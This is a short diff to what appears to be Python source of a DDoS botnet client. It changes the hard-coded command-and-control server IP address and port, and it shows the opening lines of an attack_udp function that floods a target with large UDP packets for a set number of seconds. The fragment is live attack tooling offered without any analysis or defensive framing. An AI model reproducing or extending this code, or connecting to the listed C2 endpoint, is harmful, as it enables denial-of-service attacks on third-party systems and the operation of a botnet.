@@ -9,8 +9,8 @@ import cloudscraper
 import requests
 import ctypes
 
-C2_ADDRESS = "147.185.221.27"
-C2_PORT = 4887
+C2_ADDRESS = "147.185.221.18"
+C2_PORT = 48316
 
 def attack_udp(ip, port, secs, size=65500):
     end_time = time.time() + secs
